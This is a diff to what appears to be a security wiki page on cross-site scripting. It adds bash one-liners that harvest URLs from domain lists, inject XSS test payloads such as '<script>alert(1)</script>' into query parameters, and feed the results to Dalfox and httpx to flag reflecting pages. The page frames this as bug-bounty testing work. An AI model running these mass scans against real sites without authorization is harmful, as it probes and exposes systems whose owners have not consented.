@@ -68,10 +68,16 @@ On the target side, XSS payload should looks like:
 {% endtab %}
 
 {% tab title="One-Liners" %}
-Here are some handy one-liners to automate XSS scans on domains using tools like [gau](https://github.com/lc/gau), [hakrawler](https://github.com/hakluke/hakrawler), [waybackurls](https://github.com/tomnomnom/waybackurls), [katana](https://github.com/projectdiscovery/katana), [uro](https://github.com/s0md3v/uro), [qsreplace](https://github.com/tomnomnom/qsreplace), [httpx](https://github.com/projectdiscovery/httpx), [Gxss](https://github.com/KathanP19/Gxss), [Dalfox](https://github.com/hahwul/dalfox).
+Here are some handy one-liners to automate XSS scans on domains using tools like [gau](https://github.com/lc/gau), [hakrawler](https://github.com/hakluke/hakrawler), [waybackurls](https://github.com/tomnomnom/waybackurls), [katana](https://github.com/projectdiscovery/katana), [uro](https://github.com/s0md3v/uro), [qsreplace](https://github.com/tomnomnom/qsreplace), [httpx](https://github.com/projectdiscovery/httpx), [Gxss](https://github.com/KathanP19/Gxss), [Dalfox](https://github.com/hahwul/dalfox), [Gospider](https://github.com/jaeles-project/gospider).
 
 {% hint style="success" %}
 It may be usefull for bug bounty hunting
+{% endhint %}
+
+{% hint style="info" %}
+**domains.txt** -> text file containing domain names (ex: test.domain.com)
+
+**urls.txt** -> text file containing URLs (ex: http://test.domain.com)
 {% endhint %}
 
 ```bash
@@ -79,10 +85,16 @@ It may be usefull for bug bounty hunting
 cat domains.txt | (gau || hakrawler || waybackurls || katana) | grep -Ev "\.(jpeg|jpg|png|ico|gif|css|woff|svg)$" | uro | grep =  | qsreplace "<img src=x onerror=alert(1)>" | httpx -silent -nc -mc 200 -mr "<img src=x onerror=alert(1)>"
 
 # Dalfox
-cat domains.txt | (gau || hakrawler || waybackurls || katana) | httpx -silent | Gxss -c 100 -p Xss | grep "URL" | cut -d '"' -f2 | sort -u | dalfox pipe
+cat domains.txt | (gau || hakrawler || waybackurls || katana) | httpx -silent | Gxss -c 100 -p Xss | sort -u |grep http| dalfox pipe
 
-# Curl, single domain
-echo test.target.com | (gau || hakrawler || waybackurls || katana) | grep '=' |qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable;done
+# Curl
+cat domains.txt | (gau || hakrawler || waybackurls || katana) | grep '=' |qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable "\033[0m";done
+
+# URLS and Dalfox
+gospider -S urls.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe
+
+# Dalfox, gf
+cat domains.txt | (gau || hakrawler || waybackurls || katana) | grep '=' | gf xss | sed 's/=.*/=/' | sort -u | dalfox pipe
 ```
 {% endtab %}
 {% endtabs %}
